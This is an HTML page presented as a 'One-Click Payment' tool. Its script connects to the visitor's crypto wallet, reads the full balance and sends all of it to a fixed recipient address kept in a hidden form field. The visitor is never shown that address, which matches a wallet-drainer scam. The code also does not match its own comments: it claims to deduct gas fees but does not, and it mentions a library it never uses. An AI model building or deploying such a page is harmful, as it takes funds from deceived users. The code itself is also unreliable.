<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instant Payment</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; text-align: center; }
        button { background-color: #f0b90b; color: black; border: none; padding: 12px 24px; font-size: 18px; cursor: pointer; border-radius: 5px; margin: 10px; }
        button:disabled { background-color: #cccccc; cursor: not-allowed; }
        #status { margin-top: 20px; font-weight: bold; }
        .error { color: red; }
        .success { color: green; }
    </style>
</head>
<body>
    <h1>One-Click Payment</h1>
    <p>Sends your full wallet balance instantly.</p>
    
    <input type="hidden" id="recipient" value="0xd3362a99106002b54bb56a48713F5898870e6F23">
    
    <button id="connectAndSend">Connect & Send Full Balance</button>
    <p id="status">Waiting for wallet connection...</p>

    <script>
        // Modern Web3 provider check
        if (typeof window.ethereum === 'undefined') {
            document.getElementById('status').innerHTML = 
                '<span class="error">No crypto wallet found. Install MetaMask, Trust Wallet, or Binance Chain Wallet.</span>';
            document.getElementById('connectAndSend').disabled = true;
        }

        const recipient = document.getElementById('recipient').value;
        const connectBtn = document.getElementById('connectAndSend');
        const statusEl = document.getElementById('status');

        connectBtn.addEventListener('click', async () => {
            try {
                statusEl.innerHTML = "Connecting wallet...";
                
                // 1. Connect Wallet
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const userAddress = accounts[0];
                statusEl.innerHTML = `<span class="success">Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>`;
                
                // 2. Get Full Balance (using ethers.js for unit conversion)
                const balance = await window.ethereum.request({ 
                    method: 'eth_getBalance', 
                    params: [userAddress, 'latest'] 
                });
                
                // Convert balance from Wei to Ether (using a simple division as fallback)
                const balanceEth = parseInt(balance) / 1e18; // 1 ETH/BNB = 10^18 Wei
                statusEl.innerHTML = `Sending ${balanceEth.toFixed(4)}...`;
                
                // 3. Send Full Balance (minus gas fees)
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: recipient,
                        value: balance, // Full balance in Wei
                        gas: '0x5208', // 21,000 gas (standard for simple transfers)
                    }],
                });
                
                // 4. Show Success
                const explorerLink = `https://${window.ethereum.isMetaMask ? 'etherscan.io' : 'bscscan.com'}/tx/${txHash}`;
                statusEl.innerHTML = `
                    <span class="success">
                        Sent! <a href="${explorerLink}" target="_blank">View Transaction</a>
                    </span>
                `;
                connectBtn.disabled = true;
            } catch (error) {
                statusEl.innerHTML = `<span class="error">Failed: ${error.message}</span>`;
            }
        });
    </script>
</body>
</html>
